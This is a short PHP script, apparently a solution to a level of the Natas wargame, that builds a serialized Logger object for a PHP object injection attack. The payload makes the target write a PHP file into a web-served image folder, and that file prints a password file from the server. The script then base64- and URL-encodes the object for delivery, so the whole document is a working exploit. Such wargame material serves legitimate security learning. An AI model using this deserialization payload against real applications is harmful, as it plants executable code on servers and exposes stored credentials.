<?php

class Logger{
  private $logFile;
  private $initMsg;
  private $exitMsg;

  function __construct(){
    $this->initMsg="";
    $this->exitMsg="Username: \n<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
    $this->logFile="img/injectoutput.php";
  }

}

$obj = new Logger("inject");

echo urlencode(base64_encode(serialize($obj)));

?>
